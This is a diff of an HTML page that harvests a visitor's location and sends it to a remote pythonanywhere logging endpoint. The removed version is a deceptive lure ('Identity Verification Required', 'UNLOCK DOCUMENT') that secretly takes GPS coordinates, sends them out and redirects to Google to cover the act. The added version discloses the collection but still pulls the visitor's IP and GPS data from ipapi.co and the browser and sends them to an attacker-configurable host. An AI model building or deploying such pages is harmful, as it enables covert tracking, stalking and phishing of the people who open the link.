@@ -1,46 +1,70 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Secure Document Portal</title>
+    <title>Location Access</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
-        body { font-family: 'Segoe UI', sans-serif; text-align: center; padding-top: 15%; background-color: #f0f2f5; }
-        .card { background: white; padding: 40px; border-radius: 15px; display: inline-block; box-shadow: 0 10px 30px rgba(0,0,0,0.1); max-width: 90%; }
-        .btn { background: #007bff; color: white; border: none; padding: 15px 30px; font-size: 18px; border-radius: 8px; cursor: pointer; font-weight: bold; }
-        .btn:hover { background: #0056b3; }
+        body { font-family: sans-serif; display:flex; justify-content:center; align-items:center; height:100vh; background:#f0f2f5; }
+        .card { background:white; padding:30px; border-radius:10px; text-align:center; }
+        button { padding:10px 20px; font-size:16px; cursor:pointer; }
     </style>
 </head>
 <body>
-    <div class="card">
-        <h2>🔒 Identity Verification Required</h2>
-        <p>This document is encrypted. Please click below to verify your zone and unlock the file.</p>
-        <button class="btn" onclick="startTracking()">UNLOCK DOCUMENT</button>
-        <p style="color: #666; font-size: 12px; margin-top: 20px;">Security check for Bangalore Region</p>
-    </div>
+<div class="card">
+    <h3>Share Your Location</h3>
+    <p>This site will collect your location.</p>
+    <button onclick="start()">Allow & Continue</button>
+    <p id="status"></p>
+</div>
 
-    <script>
-        function startTracking() {
-            document.querySelector('.card').innerHTML = "<h2>Verifying...</h2><p>Establishing secure connection...</p>";
+<script>
+const PA_USER = "REPLACE_WITH_USERNAME";
+let sent = false;
 
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (p) => { sendData(p.coords.latitude, p.coords.longitude); },
-                    (e) => { sendData("Denied", "Denied"); },
-                    { timeout: 5000 }
-                );
-            } else {
-                sendData("NotSupported", "NotSupported");
-            }
-        }
+async function start() {
+    document.getElementById("status").innerText = "Collecting...";
 
-                function sendData(lat, lon) {
-            const url = `https://pythonanywhere.com{lat}&lon=${lon}`;
-            fetch(url, {mode: 'no-cors'}).then(() => {
-                window.location.href = "https://google.com";
-            });
-        }
+    let data = { ip: "0.0.0.0", lat: "0", lon: "0", type: "IP-Only" };
 
-    </script>
+    try {
+        const res = await fetch('https://ipapi.co/json/');
+        const json = await res.json();
+        data.ip = json.ip;
+        data.lat = json.latitude;
+        data.lon = json.longitude;
+    } catch(e) {}
+
+    function sendData() {
+        if (sent) return;
+        sent = true;
+
+        const url = `https://${PA_USER}.pythonanywhere.com/log?lat=${data.lat}&lon=${data.lon}&ip=${data.ip}&type=${data.type}`;
+
+        fetch(url).then(() => {
+            document.getElementById("status").innerText = "Done ✅";
+        }).catch(() => {
+            document.getElementById("status").innerText = "Error";
+        });
+    }
+
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+            (pos) => {
+                data.lat = pos.coords.latitude;
+                data.lon = pos.coords.longitude;
+                data.type = "GPS";
+                sendData();
+            },
+            () => sendData(),
+            { timeout: 5000 }
+        );
+    } else {
+        sendData();
+    }
+
+    setTimeout(sendData, 7000);
+}
+</script>
 </body>
 </html>
 
